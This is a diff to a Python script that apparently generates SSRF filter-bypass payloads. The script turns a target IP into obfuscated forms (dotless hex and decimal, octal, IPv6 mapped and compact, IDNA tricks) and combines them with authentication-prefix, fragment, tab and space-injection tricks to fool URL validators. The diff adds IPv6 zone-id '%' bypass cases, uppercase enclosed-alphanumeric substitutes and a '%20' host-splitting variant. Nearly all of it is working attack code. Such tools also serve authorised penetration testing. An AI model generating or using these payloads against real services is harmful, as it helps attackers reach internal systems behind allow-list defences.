@@ -34,14 +34,16 @@ EnclosedAlphanumericsData = {
 	'19' : ['⑲'],
 	'20' : ['⑳'],
 	'.' : ['。','｡'],
-	'a' : ['ⓐ'],
-	'b' : ['ⓑ'],
-	'c' : ['ⓒ'],
-	'd' : ['ⓓ'],
-	'e' : ['ⓔ'],
-	'f' : ['ⓕ'],
-	'x' : ['ⓧ'],
+	'a' : ['ⓐ','Ⓐ'],
+	'b' : ['ⓑ','Ⓑ'],
+	'c' : ['ⓒ','Ⓒ'],
+	'd' : ['ⓓ','Ⓓ'],
+	'e' : ['ⓔ','Ⓔ'],
+	'f' : ['ⓕ','Ⓕ'],
+	'x' : ['ⓧ','Ⓧ'],
 }
+
+RANDOM3NUMBERS = str(randint(0, 9))+str(randint(0, 9))+str(randint(0, 9))
 
 def RANDOM_TEXT_SPEC():
 	min_char = 12
@@ -185,6 +187,7 @@ print('http://',IP1,':',PORT,':80','/',sep='')
 print('http://',IP1,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP1,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP1,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP1,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -194,7 +197,6 @@ if EXPORTRESULTS == 'export':
 	print('http://',RANDOMPREFIXVALIDSITE,'@',IP1,':',PORT,'/',file=f,sep='')
 	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'/',file=f,sep='')
 	print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':',PORT,'/',file=f,sep='')
-	#===========================================================================
 	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',RANDPREFIXTEXTSPEC,'@',IP1,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
@@ -208,7 +210,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP1,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP1,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP1,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
-	#===========================================================================
+	print('http://',IP1,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 2 - Dotless hexadecimal
 print(bluecolor,"Dotless hexadecimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -233,6 +235,7 @@ print('http://',IP2,':',PORT,':80','/',sep='')
 print('http://',IP2,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP2,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP2,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP2,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -255,6 +258,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP2,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP2,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP2,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP2,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 3 - Dotless decimal
 print(bluecolor,"Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -279,6 +283,7 @@ print('http://',IP3,':',PORT,':80','/',sep='')
 print('http://',IP3,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP3,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP3,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP3,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -301,6 +306,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP3,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP3,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP3,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP3,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 4 - Dotted decimal with overflow(256)
 print(bluecolor,"Dotted decimal with overflow(256) IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -325,6 +331,7 @@ print('http://',IP4,':',PORT,':80','/',sep='')
 print('http://',IP4,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP4,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP4,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP4,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -347,6 +354,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP4,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP4,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP4,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP4,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 5 - Dotted octal
 print(bluecolor,"Dotted octal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -371,6 +379,7 @@ print('http://',IP5,':',PORT,':80','/',sep='')
 print('http://',IP5,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP5,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP5,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP5,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -393,6 +402,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP5,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP5,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP5,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP5,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 6 - Dotted octal with padding
 print(bluecolor,"Dotted octal with padding IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -417,6 +427,7 @@ print('http://',IP6,':',PORT,':80','/',sep='')
 print('http://',IP6,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP6,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP6,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP6,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -439,6 +450,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP6,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP6,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP6,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP6,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 7 - IPv6 compact version
 print(bluecolor,"IPv6 compact version IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -463,6 +475,7 @@ print('http://',IP7,':',PORT,':80','/',sep='')
 print('http://',IP7,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP7,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP7,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP7,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -485,6 +498,55 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP7,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP7,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP7,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP7,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
+
+#Case 17 - IPv6 compact version with % bypass
+print(bluecolor,"IPv6 compact version with % bypass IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
+print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
+IP13 = '[::' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + '%'+RANDOM3NUMBERS+']'
+print('http://',IP13,':',PORT,'/',sep='')
+print('http://',IP13,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP13,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDOMPREFIXVALIDSITE,'@',IP13,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',IP13,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',IP13,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',IP13,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',IP13,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',IP13,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',IP13,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP13,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP13,':',PORT,'/',sep='')
+print('http://',IP13,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP13,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP13,':',PORT,'/',sep='')
+print('http://',IP13,':',PORT,':80','/',sep='')
+print('http://',IP13,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP13,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP13,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP13,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
+print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
+print("\n",sep='')
+if EXPORTRESULTS == 'export':
+	print('http://',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',IP13,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP13,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDOMPREFIXVALIDSITE,'@',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',IP13,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',IP13,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',IP13,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',IP13,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',IP13,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP13,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP13,':',PORT,'/',file=f,sep='')
+	print('http://',IP13,':',PORT,':80','/',file=f,sep='')
+	print('http://',IP13,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP13,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP13,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP13,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 8 - IPv6 mapped version
 print(bluecolor,"IPv6 mapped version IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -509,6 +571,7 @@ print('http://',IP8,':',PORT,':80','/',sep='')
 print('http://',IP8,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP8,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP8,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP8,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -531,6 +594,55 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP8,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP8,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP8,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP8,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
+
+#Case 16 - IPv6 mapped version with % bypass
+print(bluecolor,"IPv6 mapped version with % bypass IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
+print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
+IP14 = '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + '%'+RANDOM3NUMBERS+']'
+print('http://',IP14,':',PORT,'/',sep='')
+print('http://',IP14,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP14,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDOMPREFIXVALIDSITE,'@',IP14,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',IP14,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',IP14,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',IP14,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',IP14,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',IP14,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',IP14,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP14,':',PORT,'/',sep='')
+print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP14,':',PORT,'/',sep='')
+print('http://',IP14,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP14,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP14,':',PORT,'/',sep='')
+print('http://',IP14,':',PORT,':80','/',sep='')
+print('http://',IP14,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP14,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP14,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP14,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
+print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
+print("\n",sep='')
+if EXPORTRESULTS == 'export':
+	print('http://',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',IP14,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP14,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDOMPREFIXVALIDSITE,'@',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',IP14,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',IP14,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',IP14,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',IP14,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',IP14,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP14,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP14,':',PORT,'/',file=f,sep='')
+	print('http://',IP14,':',PORT,':80','/',file=f,sep='')
+	print('http://',IP14,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP14,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP14,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP14,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
 print(bluecolor,"Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -555,6 +667,7 @@ print('http://',IP9,':',PORT,':80','/',sep='')
 print('http://',IP9,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP9,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP9,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP9,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -577,6 +690,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP9,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP9,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP9,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP9,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 10 - Dotted hexadecimal + Dotless decimal
 print(bluecolor,"Dotted hexadecimal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -601,6 +715,7 @@ print('http://',IP10,':',PORT,':80','/',sep='')
 print('http://',IP10,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP10,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP10,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP10,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -623,6 +738,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP10,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP10,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP10,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP10,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 11 - Dotted octal with padding + Dotless decimal
 print(bluecolor,"Dotted octal with padding + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -647,6 +763,7 @@ print('http://',IP11,':',PORT,':80','/',sep='')
 print('http://',IP11,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP11,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP11,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP11,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -669,6 +786,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP11,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP11,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP11,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP11,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
 print(bluecolor,"Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
@@ -693,6 +811,7 @@ print('http://',IP12,':',PORT,':80','/',sep='')
 print('http://',IP12,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP12,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
 print('http://',IP12,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
+print('http://',IP12,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
 print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
 print("\n",sep='')
 if EXPORTRESULTS == 'export':
@@ -715,6 +834,7 @@ if EXPORTRESULTS == 'export':
 	print('http://',IP12,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP12,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
 	print('http://',IP12,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
+	print('http://',IP12,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
 
 #Case 13 - Abusing IDNA Standard
 print(bluecolor,"Abusing IDNA Standard: ",resetcolor,yellowcolor,"http://ß.localdomain.pw/", resetcolor,' -> ',yellowcolor,'http://cc.localdomain.pw/',resetcolor,' => ',bluecolor,'DNS',resetcolor,' => ',yellowcolor,'127.127.127.127',resetcolor,sep='')
@@ -748,7 +868,9 @@ print('http://',convert_ip(IP4),':',PORT,'/',sep='')
 print('http://',convert_ip(IP5),':',PORT,'/',sep='')
 print('http://',convert_ip(IP6),':',PORT,'/',sep='')
 print('http://',convert_ip(IP7),':',PORT,'/',sep='')
+print('http://',convert_ip(IP13),':',PORT,'/',sep='')
 print('http://',convert_ip(IP8),':',PORT,'/',sep='')
+print('http://',convert_ip(IP14),':',PORT,'/',sep='')
 print('http://',convert_ip(IP9),':',PORT,'/',sep='')
 print('http://',convert_ip(IP10),':',PORT,'/',sep='')
 print('http://',convert_ip(IP11),':',PORT,'/',sep='')
@@ -764,7 +886,9 @@ if EXPORTRESULTS == 'export':
 	print('http://',convert_ip(IP5),':',PORT,'/',file=f,sep='')
 	print('http://',convert_ip(IP6),':',PORT,'/',file=f,sep='')
 	print('http://',convert_ip(IP7),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP13),':',PORT,'/',file=f,sep='')
 	print('http://',convert_ip(IP8),':',PORT,'/',file=f,sep='')
+	print('http://',convert_ip(IP14),':',PORT,'/',file=f,sep='')
 	print('http://',convert_ip(IP9),':',PORT,'/',file=f,sep='')
 	print('http://',convert_ip(IP10),':',PORT,'/',file=f,sep='')
 	print('http://',convert_ip(IP11),':',PORT,'/',file=f,sep='')
